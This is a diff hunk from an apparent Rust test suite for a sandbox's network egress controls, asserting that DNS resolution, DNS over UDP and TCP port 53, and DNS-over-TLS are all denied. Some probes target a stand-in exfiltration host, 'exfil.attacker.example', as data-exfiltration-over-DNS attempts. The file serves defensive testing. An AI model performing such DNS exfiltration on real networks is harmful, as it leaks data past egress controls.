@@ -45,7 +45,7 @@ fn cat03_name_resolution() {
     let (h, up) = upstream_harness("[[egress]]\nhost = \"dns.google\"\n");
     control(&h, &up);
     // No resolver inside the sandbox: libc resolution, UDP/53, TCP/53 (TXT) all fail.
-    assert_denied(&h.probe(&["dns", "example.com"]), "getaddrinfo");
+    assert_denied(&h.probe(&["dns", "example.com"]), "libc name resolution");
     assert_denied(&h.probe(&["dns-udp", "8.8.8.8", "exfil.attacker.example", "16"]), "DNS TXT over UDP/53");
     assert_denied(&h.probe(&["dns-tcp", "8.8.8.8", "exfil.attacker.example", "16"]), "DNS over TCP/53");
     assert_denied(&h.probe(&["tcp", "1.1.1.1", "853"]), "DoT");
